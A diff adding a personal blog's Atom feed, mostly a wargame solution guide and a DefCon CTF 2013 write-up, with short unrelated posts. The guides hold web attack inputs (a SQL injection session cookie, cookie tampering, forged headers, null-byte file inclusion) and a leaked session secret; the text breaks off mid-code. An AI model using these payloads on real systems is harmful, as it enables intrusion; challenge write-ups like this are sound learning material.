@@ -1,0 +1,869 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[xelz's blog]]></title>
+  <link href="http://xelz.info/atom.xml" rel="self"/>
+  <link href="http://xelz.info/"/>
+  <updated>2014-07-29T13:00:00+08:00</updated>
+  <id>http://xelz.info/</id>
+  <author>
+    <name><![CDATA[xelz]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Solution for Google banning Linodes]]></title>
+    <link href="http://xelz.info/blog/2014/07/29/resolve-google-ban-linode/"/>
+    <updated>2014-07-29T02:00:00+08:00</updated>
+    <id>http://xelz.info/blog/2014/07/29/resolve-google-ban-linode</id>
+    <content type="html"><![CDATA[<h3>Google banned Linodes</h3>
+
+<p>I usually use linode to visit Google services via ssh tunnel. but recently I always got captchas even <code>Sorry...</code> page.</p>
+
+<p>Finally I knows that google banned ipv6 traffics from linode which they treated as robots.</p>
+
+<h3>Solution</h3>
+
+<p>disable ipv6 of linode</p>
+
+<h4>for Ubuntu</h4>
+
+<p>append lines below to <code>/etc/sysctl.conf</code></p>
+
+<ul>
+<li><p>net.ipv6.conf.all.disable_ipv6=1</p></li>
+<li><p>net.ipv6.conf.default.disable_ipv6=1</p></li>
+<li><p>net.ipv6.conf.lo.disable_ipv6=1</p></li>
+</ul>
+
+
+<p>then restart network <code>/etc/init.d/networking restart</code> or <code>reboot</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[New to Jekyll!]]></title>
+    <link href="http://xelz.info/blog/2014/07/26/new-to-jekyll/"/>
+    <updated>2014-07-26T01:58:57+08:00</updated>
+    <id>http://xelz.info/blog/2014/07/26/new-to-jekyll</id>
+    <content type="html"><![CDATA[<p>Hello Jekyll.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Write Up of a Very Interesting Wargame]]></title>
+    <link href="http://xelz.info/blog/2014/06/10/write-up-of-a-very-interesting-wargame/"/>
+    <updated>2014-06-10T02:00:00+08:00</updated>
+    <id>http://xelz.info/blog/2014/06/10/write-up-of-a-very-interesting-wargame</id>
+    <content type="html"><![CDATA[<p>Recently I&rsquo;m playing a wargame named [shhhh&hellip; edited].</p>
+
+<p>I&rsquo;ve hidden the game name so that challengers could not find here by some searching work.</p>
+
+<p>If you guys are about to cheat by this, get lost now.</p>
+
+<p>You can find the game at [url]<code>c-a-n-y-o-u-h-a-c-k.i-t</code>(replace the dash with nothing)</p>
+
+<p>Try to figure out by yourself, if you are really really really stucked, have a sight for some hints.</p>
+
+<!-- more -->
+
+
+<h2>Logic</h2>
+
+<h4>Logic 1</h4>
+
+<p>password is just <code>password</code></p>
+
+<h4>Logic 2</h4>
+
+<p>It&rsquo;s a kind of pun. If you cannot guess the riddle, just answer <code>no</code>.</p>
+
+<p>Acturually the answer is Nitric Oxide, as known as <code>NO</code></p>
+
+<h4>Logic 3</h4>
+
+<p>Inspect the source code, you will find the password in comment.</p>
+
+<h4>Logic 4</h4>
+
+<p><strong>Fibonacci Prime</strong></p>
+
+<p>prime(n) = 2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271 &hellip;</p>
+
+<p>fibonacci(n) = 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144 &hellip;</p>
+
+<ul>
+<li>prime(fibonacci(1)) = prime(1) = 2</li>
+<li>prime(fibonacci(2)) = prime(2) = 3</li>
+<li>prime(fibonacci(3)) = prime(3) = 5</li>
+<li>prime(fibonacci(4)) = prime(5) = 11</li>
+<li>&hellip;</li>
+<li>prime(fibonacci(8)) = prime(55) = 139</li>
+<li>prime(fibonacci(9)) = prime(55) = 257</li>
+</ul>
+
+
+<h2>Script</h2>
+
+<h4>Script 1</h4>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#password&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&quot;javascript&quot;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>password is <code>javascript</code></p>
+
+<h4>Script 2</h4>
+
+<p>Run this code in javasript console, then check the value of variable <code>password</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="s2">&quot;de9f8caa7ea6fe56830925a124d605d4&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>    <span class="nx">password</span> <span class="o">+=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">substring</span><span class="p">((</span><span class="nx">i</span><span class="o">%</span><span class="mi">3</span><span class="p">),(</span><span class="nx">i</span><span class="o">%</span><span class="mi">5</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">i</span><span class="o">%</span><span class="mi">3</span><span class="p">));</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Script 3</h4>
+
+<p>Run this code in javasript console, then check the value of variable <code>password</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">keys</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span> <span class="s2">&quot;2&quot;</span><span class="p">,</span> <span class="s2">&quot;3&quot;</span><span class="p">,</span> <span class="s2">&quot;4&quot;</span><span class="p">,</span> <span class="s2">&quot;5&quot;</span><span class="p">,</span> <span class="s2">&quot;6&quot;</span><span class="p">,</span> <span class="s2">&quot;7&quot;</span><span class="p">,</span> <span class="s2">&quot;8&quot;</span><span class="p">,</span> <span class="s2">&quot;9&quot;</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="s2">&quot;C&quot;</span><span class="p">,</span> <span class="s2">&quot;D&quot;</span><span class="p">,</span> <span class="s2">&quot;E&quot;</span><span class="p">,</span> <span class="s2">&quot;F&quot;</span><span class="p">,</span> <span class="s2">&quot;G&quot;</span><span class="p">,</span> <span class="s2">&quot;H&quot;</span><span class="p">,</span> <span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="s2">&quot;J&quot;</span><span class="p">,</span> <span class="s2">&quot;K&quot;</span><span class="p">,</span> <span class="s2">&quot;L&quot;</span><span class="p">,</span> <span class="s2">&quot;M&quot;</span><span class="p">,</span> <span class="s2">&quot;N&quot;</span><span class="p">,</span> <span class="s2">&quot;O&quot;</span><span class="p">,</span> <span class="s2">&quot;P&quot;</span><span class="p">,</span> <span class="s2">&quot;Q&quot;</span><span class="p">,</span> <span class="s2">&quot;R&quot;</span><span class="p">,</span> <span class="s2">&quot;S&quot;</span><span class="p">,</span> <span class="s2">&quot;T&quot;</span><span class="p">,</span> <span class="s2">&quot;U&quot;</span><span class="p">,</span> <span class="s2">&quot;V&quot;</span><span class="p">,</span> <span class="s2">&quot;W&quot;</span><span class="p">,</span> <span class="s2">&quot;X&quot;</span><span class="p">,</span> <span class="s2">&quot;Y&quot;</span><span class="p">,</span> <span class="s2">&quot;Z&quot;</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span><span class="p">,</span> <span class="s2">&quot;c&quot;</span><span class="p">,</span> <span class="s2">&quot;d&quot;</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;f&quot;</span><span class="p">,</span> <span class="s2">&quot;g&quot;</span><span class="p">,</span> <span class="s2">&quot;h&quot;</span><span class="p">,</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="s2">&quot;j&quot;</span><span class="p">,</span> <span class="s2">&quot;k&quot;</span><span class="p">,</span> <span class="s2">&quot;l&quot;</span><span class="p">,</span> <span class="s2">&quot;m&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">,</span> <span class="s2">&quot;o&quot;</span><span class="p">,</span> <span class="s2">&quot;p&quot;</span><span class="p">,</span> <span class="s2">&quot;q&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">,</span> <span class="s2">&quot;s&quot;</span><span class="p">,</span> <span class="s2">&quot;t&quot;</span><span class="p">,</span> <span class="s2">&quot;u&quot;</span><span class="p">,</span> <span class="s2">&quot;v&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">,</span> <span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;y&quot;</span><span class="p">,</span> <span class="s2">&quot;z&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">password</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nx">k</span> <span class="o">=</span> <span class="s2">&quot;17 4 59 0 53 28&quot;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
+</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="k">in</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">password</span> <span class="o">+=</span> <span class="nx">keys</span><span class="p">[</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">i</span><span class="p">])];</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<h2>Cryptography</h2>
+
+<h4>Cryptography 1</h4>
+
+<p>The <strong>Salad Cipher</strong>, aka <strong>ROT13</strong></p>
+
+<p>Decryption Key</p>
+
+<pre><code>A|B|C|D|E|F|G|H|I|J|K|L|M
+-------------------------
+N|O|P|Q|R|S|T|U|V|W|X|Y|Z
+</code></pre>
+
+<p>letter above equals below, and vice versa</p>
+
+<h4>Cryptography 2</h4>
+
+<p>Try to combine some words using the numbers with T9 IME on a mobile phone.</p>
+
+<table style="text-align: center;">
+<tr><td><p>1</p>&#8217;</td><td><p>2</p>ABC</td><td><p>3</p>DEF</td></tr>
+<tr><td><p>4</p>GHI</td><td><p>5</p>JKL</td><td><p>6</p>MNO</td></tr>
+<tr><td><p>7</p>PQRS</td><td><p>8</p>TUV</td><td><p>9</p>WXYZ</td></tr>
+</table>
+
+
+<h4>Cryptography 3</h4>
+
+<p><strong>Base64</strong> decode it.</p>
+
+<h4>Cryptography 4</h4>
+
+<p><strong>Caesar&rsquo;s Square</strong></p>
+
+<pre><code>TSDLN ILHSY OGSRE WOOFR OPOUK OAAAR RIRID
+</code></pre>
+
+<p>Count the number of letters, here we have 35
+We can put 35 into 5 rows of 7</p>
+
+<pre><code>TSDLNIL
+HSYOGSR
+EWOOFRO
+POUKOAA
+ARRIRID
+</code></pre>
+
+<p>Read it, downwards from the top left, then the next column.</p>
+
+<h4>Cryptography 6</h4>
+
+<p><strong>Morse Alphabet</strong></p>
+
+<h4>Cryptography 7</h4>
+
+<p><strong>ASCII</strong></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#python</span>
+</span><span class='line'><span class="n">text</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s">&#39;84 104 101 32 115 101 99 114 101 116 32 119 111 114 100 32 121 111 117 39 114 101 32 115 101 97 114 99 104 105 110 103 32 102 111 114 32 105 115 32 115 101 99 114 101 116&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)])</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<h4>Cryptography 8</h4>
+
+<p><strong>Atbash</strong> (similar with the Salad Cipher)</p>
+
+<pre><code>A|B|C|D|E|F|G|H|I|J|K|L|M
+-------------------------
+Z|Y|X|W|V|U|T|S|R|Q|P|O|N
+</code></pre>
+
+<p>letter above equals below, and vice versa</p>
+
+<p>in another way</p>
+
+<pre><code>Plain:  ABCDEFGHIJKLMNOPQRSTUVWXYZ
+Cipher: ZYXWVUTSRQPONMLKJIHGFEDCBA
+</code></pre>
+
+<h4>Cryptography 9</h4>
+
+<p><strong>Polybius Square</strong></p>
+
+<table>
+<thead>
+    <tr><td>\</td><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr>
+</thead>
+<tbody>
+    <tr><th>1</th><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td></tr>
+    <tr><th>2</th><td>F</td><td>G</td><td>H</td><td>I</td><td>K</td></tr>
+    <tr><th>3</th><td>L</td><td>M</td><td>N</td><td>O</td><td>P</td></tr>
+    <tr><th>4</th><td>Q</td><td>R</td><td>S</td><td>T</td><td>U</td></tr>
+    <tr><th>5</th><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td></tr>
+</tbody>
+</table>
+
+
+<p>Each letter is then represented by its coordinates in the grid. For example, <code>BAT</code> becomes <code>12 11 44</code>. Because 26 characters do not quite fit in a square, it is rounded down to the next lowest square number by combining two letters (usually I and J).</p>
+
+<h4>Cryptography 11</h4>
+
+<p>The index of a letter in the <code>alphabt</code>. 0 indicates a blank.</p>
+
+<h4>Cryptography 13</h4>
+
+<p>A programming language named <strong>BrainFuck</strong>.</p>
+
+<h4>Cryptography 16</h4>
+
+<p>Read it in a human readable way. Starting with the top left <code>T</code>, then <code>H</code> under it, and then <code>E</code> on the right side. Hints in the title <code>clues</code>.</p>
+
+<h4>Cryptography 17</h4>
+
+<p><strong>MD5</strong> ，brute force it with the hint <code>a-z*6</code>, or try cmd5.org.</p>
+
+<h4>Cryptography 22</h4>
+
+<p>Static crypto table with a reverse. the crypto table can be easily dumped.</p>
+
+<pre><code>e7 a4 90 71 36 49 aa e6 5b 3a ef 64 a0 be eb 09 f2 8c 57 ec 8f 74 1f 01 51 98 
+Z  Y  X  W  V  U  T  S  R  Q  P  O  N  M  L  K  J  I  H  G  F  E  D  C  B  A
+
+91 72 61 3f 69 fe 4b fa 85 fd 14 68 73 26 0f ac cc a1 4d db ab 43 46 11 08 b7
+z  y  x  w  v  u  t  s  r  q  p  o  n  m  l  k  j  i  h  g  f  e  d  c  b  a
+
+d8 b0 31 07 cf 8e 45 24 0b 5a
+0  9  8  7  6  5  4  3  2  1
+
+92 35 00 c6 3d 55 96 54 7d f6 e9
+)  (  *  &amp;  ^  %  $  #  @  !   
+
+cb d9 21 3e af 38 8b 4e 9e ea 0a 4c 04 58 6d b6 67 29 13 c5
+?  &gt;  &lt;  "  :  |  }  {  +  _  /  .  ,  '  ;  \  ]  [  =  -
+</code></pre>
+
+<h4>Cryptography 25</h4>
+
+<p><strong>Braille Alphabet</strong></p>
+
+<h2>WEB Based</h2>
+
+<h4>Web 1</h4>
+
+<pre><code>Page=Admin
+</code></pre>
+
+<h4>Web 2</h4>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">// javascript</span>
+</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s1">&#39;isAdmin=1&#39;</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Web 3</h4>
+
+<pre><code>/robots.txt
+</code></pre>
+
+<h4>Web 4</h4>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl -H <span class="s1">&#39;Referer: www.google.com&#39;</span> <span class="s1">&#39;http://theurl/Content/Challenges/Web/Web4.php&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Web 5</h4>
+
+<p>Do not waste time on the form because nothing happend when you click the button.</p>
+
+<pre><code>SESSION=abf3e2d32ec32' or '1'='1' --
+</code></pre>
+
+<h4>Web 6</h4>
+
+<p>look around <a href="http://theurl/Content/Challenges/Web/Files6/">http://theurl/Content/Challenges/Web/Files6/</a></p>
+
+<h4>Web 7</h4>
+
+<pre><code>curl -d 'Type=admin' 'http://theurl/Content/Challenges/Web/Web7.php'
+</code></pre>
+
+<h4>Web 8</h4>
+
+<pre><code>Page[]=Home 
+</code></pre>
+
+<p>will trigger a php <code>fatal error</code>, which will display the error stack including the full path of the file in the page.</p>
+
+<h4>Web 9</h4>
+
+<pre><code>File=Files9/passconfigs.php%00
+</code></pre>
+
+<h4>Web 10</h4>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl <span class="s1">&#39;http://theurl/Content/Challenges/Web/Web10.php&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<h2>Microhard</h2>
+
+<h4>CCTV</h4>
+
+<p>Try to find something in the terminal</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">help</span>
+</span><span class='line'><span class="nb">echo </span>learninglog.txt
+</span><span class='line'>apt-get install ***
+</span><span class='line'>ifconfig
+</span><span class='line'>*** 192.***
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then an open port of a alive host which may be the remote camera.
+Open it in Firefox and then successfully we can get the CCTV admin page.</p>
+
+<p>Try to login with someone&rsquo;s name as the password.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[For Our One Year Anniversary]]></title>
+    <link href="http://xelz.info/blog/2014/04/21/for-our-one-year-anniversary/"/>
+    <updated>2014-04-21T04:00:00+08:00</updated>
+    <id>http://xelz.info/blog/2014/04/21/for-our-one-year-anniversary</id>
+    <content type="html"><![CDATA[<p>I make this page to remember our love.</p>
+
+<p>GitHub: <a href="">https://github.com/xelzmm/Love</a></p>
+
+<p>View: <a href="">http://iloveyamei.aliapp.com</a></p>
+
+<p><img src="http://xelz.info/assets/2014/one-year.jpg" alt="" /></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DefCon CTF Qualifier 2013 3dub 3 Write Up]]></title>
+    <link href="http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up/"/>
+    <updated>2013-06-28T20:00:00+08:00</updated>
+    <id>http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up</id>
+    <content type="html"><![CDATA[<p>mirror of <a href="http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/">http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/</a></p>
+
+<p>First of all, we got a <code>secrets</code> link and <code>log in or create user</code> form. When we create and login, the website redirect us to the &lsquo;secrets&rsquo; page like this</p>
+
+<blockquote><p>Secrets</p>
+
+<p>name owner actions</p>
+
+<p>key admin <a href="#">show</a></p>
+
+<p>nothing asdf <a href="#">show</a></p>
+
+<p><a href="#">new secret</a></p></blockquote>
+
+<p>we&rsquo;ve got some links to see secrets owned by other users, include the <code>admin</code>, or easily add a new secret ourselves.</p>
+
+<p>Having a try to open the admin&rsquo;s secret, we got a 500 Error Page with some error stack, which powered by the Ruby framework <code>Sinatra</code>.</p>
+
+<p>From the very first sight of the page, it said <code>unauthorized</code> as the error message and a piece of source code was provided</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">redirect</span> <span class="s1">&#39;/secrets&#39;</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">get</span> <span class="s1">&#39;/secrets/:id&#39;</span> <span class="k">do</span>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">SECRETS</span><span class="o">[</span><span class="n">params</span><span class="o">[</span><span class="ss">:id</span><span class="o">].</span><span class="n">to_i</span><span class="o">]</span>
+</span><span class='line'><span class="k">raise</span> <span class="s2">&quot;unauthorized&quot;</span> <span class="k">if</span> <span class="n">session</span><span class="o">[</span><span class="ss">:user_name</span><span class="o">]</span> <span class="o">!=</span> <span class="n">s</span><span class="o">.</span><span class="n">username</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">haml</span> <span class="ss">:secret</span><span class="p">,</span> <span class="ss">locals</span><span class="p">:</span> <span class="p">{</span><span class="ss">secret</span><span class="p">:</span> <span class="n">s</span><span class="p">}</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">helpers</span> <span class="k">do</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">current_user</span>
+</span><span class='line'>    <span class="k">return</span> <span class="kp">nil</span> <span class="k">unless</span> <span class="n">session</span><span class="o">[</span><span class="ss">:user_name</span><span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- more -->
+
+
+<p>It meant that I&rsquo;m not the secret&rsquo;s holder. then have a look at the whole page, and you would find some environment variable in the <code>Rack ENV</code> section, partly like</p>
+
+<ul>
+<li>rack.session</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;session_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a&quot;</span><span class="p">,</span> <span class="s2">&quot;tracking&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_ENCODING&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ed2b3ca90a4e723402367a1d17c8b28392842398&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6&quot;</span><span class="p">},</span> <span class="s2">&quot;csrf&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6&quot;</span><span class="p">,</span> <span class="s2">&quot;user_name&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;test&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>rack.session.options</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="ss">:path</span><span class="o">=&gt;</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="ss">:domain</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span> <span class="ss">:expire_after</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span> <span class="ss">:secure</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:httponly</span><span class="o">=&gt;</span><span class="kp">true</span><span class="p">,</span> <span class="ss">:defer</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:renew</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:sidbits</span><span class="o">=&gt;</span><span class="mi">128</span><span class="p">,</span> <span class="ss">:secure_random</span><span class="o">=&gt;</span><span class="no">SecureRandom</span><span class="p">,</span> <span class="ss">:secret</span><span class="o">=&gt;</span><span class="s2">&quot;wroashsoxDiculReejLykUssyifabEdGhovHabno&quot;</span><span class="p">,</span> <span class="ss">:coder</span><span class="o">=&gt;</span><span class="c1">#}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>rack.session.unpacked_cookie_data</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;session_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a&quot;</span><span class="p">,</span> <span class="s2">&quot;tracking&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_ENCODING&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ed2b3ca90a4e723402367a1d17c8b28392842398&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6&quot;</span><span class="p">},</span> <span class="s2">&quot;csrf&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6&quot;</span><span class="p">,</span> <span class="s2">&quot;user_name&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;test&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>rack.request.cookie_hash</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
